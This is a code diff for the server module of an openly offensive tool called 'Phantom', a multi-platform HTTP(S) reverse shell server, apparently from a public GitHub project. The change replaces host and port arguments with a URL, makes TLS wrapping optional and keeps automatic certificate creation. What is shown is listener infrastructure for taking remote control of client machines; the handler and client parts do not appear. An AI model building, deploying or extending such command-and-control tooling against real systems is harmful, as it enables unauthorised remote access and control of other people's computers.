+++ src/server/server.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-Phantom
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
@@ -8,31 +8,27 @@ import sys
 from http.server import HTTPServer
 from pathlib import Path
 
+from src.phantom import Phantom
 from src.server.handler import ShellHandler
 
 from trustme import CA
 
 
-class ShellServer:
-    def __init__(self,
-                 host: str,
-                 port: int, *,
+class ShellServer(Phantom):
+    def __init__(self, *,
+                 server_url: str,
                  server_cert: [str, Path] = None):
         """Create a Reverse Shell Server that communicates with clients
-        through HTTPS.
+        through HTTP(S).
 
-        :param host: Server address or hostname.
-        :param port: Port number to bind the server to.
+        :param server_url: Full URL for the server (with optional port
+            number) in the format 'SCHEME://DOMAIN|ADDRESS[:PORT]'.
+            Ex: http://192.168.0.10:8080 or https://your-domain.com
         :param server_cert: Path to a file containing the server
             certificate in PEM format.
         """
-        self.host = host
-        self.port = port
+        super().__init__(server_url)
         self.server_cert = server_cert
-
-    @property
-    def server_address(self) -> tuple[str, int]:
-        return self.host, self.port
 
     @property
     def _base_path(self) -> Path:
@@ -47,10 +43,9 @@ class ShellServer:
 
     @property
     def server_cert(self) -> Path:
-        """
-        Gets a valid path to the server certificate file.
+        """Gets a valid path to the server certificate file.
         Sets the path to the server certificate or creates a new CA that
-        signs it and writes to a file.
+        signs and writes it to a file.
         """
         return self._server_cert
 
@@ -58,23 +53,28 @@ class ShellServer:
     def server_cert(self, path: [str, Path]) -> None:
         server_cert = self._base_path.joinpath("server.pem") if \
             path is None else Path(path)
-        if not server_cert.exists():  # Create server certificate
+        if not server_cert.exists() and self._scheme == "https":
+            '''A default server certificate for 'localhost' is created 
+            if a certificate file is not supplied and the scheme is 
+            HTTPS'''
             (ca := CA()).cert_pem.write_to_path("ca.pem")
-            signed_cert = ca.issue_cert(self.host)
+            signed_cert = ca.issue_cert(self._host)
             signed_cert.private_key_and_cert_chain_pem.write_to_path(
                 str(server_cert))
         self._server_cert = server_cert
 
     def execute(self) -> None:
-        with HTTPServer(self.server_address, ShellHandler) as httpd:
+        with HTTPServer((self._host, self._port), ShellHandler) as httpd:
             try:
-                print("[>] Server started on https://{0}:{1}".format(
-                    *self.server_address))
-                print("[>] Waiting for connections...")
-                httpd.socket = ssl.wrap_socket(sock=httpd.socket,
-                                               server_side=True,
-                                               certfile=str(self.server_cert),
-                                               ssl_version=ssl.PROTOCOL_TLS)
+                if self._scheme == "https":
+                    httpd.socket = ssl.wrap_socket(
+                        sock=httpd.socket,
+                        server_side=True,
+                        certfile=str(self.server_cert),
+                        ssl_version=ssl.PROTOCOL_TLS
+                    )
+                print(f"[>] Server started on {self.server_url}")
+                print("[>] Waiting for connections (press Ctrl+C to abort)...")
                 httpd.serve_forever()
             except KeyboardInterrupt:
                 print("\n[!] Shutting down the server...")
@@ -83,18 +83,15 @@ class ShellServer:
 if __name__ == "__main__":
     import argparse
 
-    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Server")
-    parser.add_argument(
-        "host",
-        type=str,
-        metavar="<hostname/address>",
-        help="Server address or hostname."
+    parser = argparse.ArgumentParser(
+        description="Phantom - A multi-platform HTTP(S) Reverse Shell Server"
     )
     parser.add_argument(
-        "port",
-        type=int,
-        metavar="<port>",
-        help="Port number to bind the server to."
+        "url",
+        type=str,
+        help="Full URL for the server (with optional port number) in the "
+             "format 'SCHEME://DOMAIN|ADDRESS[:PORT]'. "
+             "Ex: http://192.168.0.10:8080 or https://your-domain.com"
     )
     parser.add_argument(
         "--server-cert",
@@ -106,8 +103,4 @@ if __name__ == "__main__":
 
     _args = parser.parse_args()
 
-    ShellServer(
-        host=_args.host,
-        port=_args.port,
-        server_cert=_args.server_cert
-    ).execute()
+    ShellServer(server_url=_args.url, server_cert=_args.server_cert,).execute()